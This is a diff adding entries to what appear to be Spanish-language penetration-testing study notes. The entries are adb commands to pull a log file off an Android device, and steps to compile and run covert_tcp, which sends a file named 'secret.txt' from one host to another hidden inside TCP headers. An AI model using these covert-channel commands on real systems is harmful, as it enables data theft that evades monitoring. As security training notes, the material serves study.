@@ -81,3 +81,24 @@ Algunos ejemplos de comandos que se pueden ejecutar dentro de la sesión de shel
 #### Ejemplo
 Este es un ejemplo de como listar información.
 `cat Tradeinfo`
+
+
+# Download a File from Android using ADB tool
+adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
+adb pull sdcard/log.txt /home/mmurphy/Desktop
+
+
+Covert TCP
+Covert
+Covert_tcp source code Live Demo Covert TCP Live Demo-Youtube
+
+# Compile the Code  
+cc -o covert_tcp covert_tcp.c
+  
+# Reciever Machine(192.168.29.53)  
+sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 9999 -dest_port 8888 -server -file recieve.txt  
+ 
+# Sender Machine(192.168.29.123) 
+# Create A Message file that need to be transferred Eg:secret.txt
+sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 8888 -dest_port 9999 -file secret.txt
+
